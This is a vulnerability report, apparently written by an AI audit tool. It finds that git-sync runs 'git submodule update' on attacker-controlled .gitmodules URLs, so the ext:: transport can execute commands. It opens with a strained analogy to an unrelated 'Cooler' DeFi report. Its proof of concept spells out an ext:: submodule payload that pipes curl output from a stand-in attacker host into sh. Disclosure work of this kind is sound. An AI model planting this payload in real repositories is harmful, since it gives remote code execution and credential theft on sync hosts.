### Title
Untrusted `.gitmodules` submodule URLs enable arbitrary command execution during `git submodule update` - (File: main.go)

### Summary
The Cooler report is fundamentally about an untrusted/adversarial party being able to supply attacker-controlled parameters that are consumed by privileged logic without validation, causing damage to the victim (borrower). The reachable analog in `git-sync` is the submodule handling in `configureWorktree`, where fields from an attacker-pushed commit's `.gitmodules` (submodule URLs) are passed unfiltered into `git submodule update --init [--recursive]`, a command whose URL scheme space includes the `ext::` transport helper capable of executing arbitrary shell commands.

### Finding Description
When `--submodules` is not `off` (the default is `recursive`), `configureWorktree` runs: [1](#0-0) 
This invokes `git submodule update --init [--recursive] [--depth N]` in the worktree via `git.Run`, which shells out to the real `git` binary with no restriction on submodule URL protocol. `git-sync` fully trusts the content of the remote repository it syncs — including `.gitmodules` — since the whole design intentionally pulls "untrusted repo content" from a remote source and materializes it locally (`README.md:151-210` describes fetching, checking out, and updating submodules as part of the normal, expected flow). Nothing in `initRepo`, `fetch`, or `configureWorktree` sets `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow=never`, or otherwise sanitizes/allowlists submodule URL schemes before calling `git submodule update`.

Native `git` supports the `ext::` transport (`git submodule add ext::sh -c 'touch /tmp/pwned; git upload-pack "$0"' "arbitrary_repo"`) which, if present in `.gitmodules`, causes the referenced command to be exec'd on the machine running `git submodule update`. Because `git-sync` runs this operation automatically and unattended on every sync cycle as a sidecar with no human review of incoming commits/refs, a party who can push a commit or control the ref being synced (e.g., a compromised/malicious upstream contributor, or anyone who can influence the branch/tag/commit `git-sync` is pointed at) can embed such a URL and have it executed inside the git-sync container the moment that commit is synced.

This directly parallels the Cooler root cause: a boundary that is supposed to separate "data a peer supplies" from "actions taken with elevated trust" is missing — just as the lender's loan-roll parameters were blindly trusted and acted upon by the protocol, here the remote repository content (`.gitmodules`) is blindly trusted and acted upon by invoking `git submodule update`.

### Impact Explanation
Successful exploitation yields arbitrary command execution inside the git-sync container/sidecar, running with whatever UID/permissions git-sync has. Because `--root` is typically a shared volume with the consuming application container in Kubernetes deployments, this can lead to: reading and exfiltrating any credentials mounted for git-sync (SSH keys, `--credential` passwords, cookie files, GitHub App private keys — see `main.go:2596-2615`, `docs/cookie-file.md`), writing/deleting arbitrary files reachable by the process (including outside `--root` if the process has broader filesystem access), and persistent denial of sync (e.g., corrupting the repo state so subsequent syncs fail). This satisfies the "Accept" criteria of code execution and credential disclosure from the validation rubric.

### Likelihood Explanation
Likelihood depends on the trust model of the `--repo` being synced: if `git-sync` points at a repository where any external/less-trusted party can land a commit (a public repo accepting PRs merged automatically, a mirrored/forked branch, or a ref an attacker can otherwise get synced), the attack is straightforward and requires no special git-sync flags beyond the default `--submodules=recursive`/`shallow` behavior. If the upstream repo is fully trusted and write-restricted, the exposure is lower, mirroring the "how likely are massively over-collateralized loans" mitigation discussion in the original report — i.e., severity is conditioned on real-world usage patterns rather than being a universally-triggerable bug.

### Recommendation
- Before invoking `git submodule update`, restrict allowed transports by setting `GIT_ALLOW_PROTOCOL` (or configuring `protocol.allow`/`protocol.ext.allow=never`, `protocol.file.allow=never` as appropriate) in the environment/config used for the `git` invocations in `configureWorktree`.
- Consider exposing an explicit git-sync flag (e.g., `--submodules-allow-protocols`) defaulting to a safe allowlist (`https`, `ssh`, `git`) and documenting the risk of `ext::`/`file::` transports in submodule content.
- Audit other places `git.Run` is invoked with arguments derived from repo content (not just static flags) for similar unsanitized-protocol issues.

### Proof of Concept
1. Attacker with push access to a branch/ref that a `git-sync` instance is configured to follow (`--ref`) adds a malicious submodule entry to `.gitmodules`:
   ```
   git submodule add ext::'sh -c "curl http://attacker/x|sh; git upload-pack \"$1\""' payload
   git commit -am "add submodule"
   git push
   ```
2. On its next poll, `git-sync`'s `SyncRepo` detects the new hash, calls `createWorktree` then `configureWorktree`: [2](#0-1) 
3. `configureWorktree` runs `git reset --hard <hash>` (materializing `.gitmodules`) and then, since `git.submodules != submodulesOff`, runs `git submodule update --init [--recursive]`: [3](#0-2) 
4. Git resolves the `ext::` URL and executes the attacker's shell command inside the git-sync container, with no protocol restriction present anywhere in the codebase (`GIT_ALLOW_PROTOCOL` / `protocol.ext.allow` not found in `main.go` or elsewhere in the non-vendor source).

**Note on limitations:** I was unable to fully verify with certainty whether any environment-level protocol restriction is applied globally to the `git` binary used by the container image (e.g., via a system-wide git config baked into the Docker image) since that is outside the indexed source files; if such a global restriction exists at the image level, this finding would be mitigated. This should be verified directly against the actual container image / Dockerfile in a full Devin session, since index size limits may exclude some file contents.
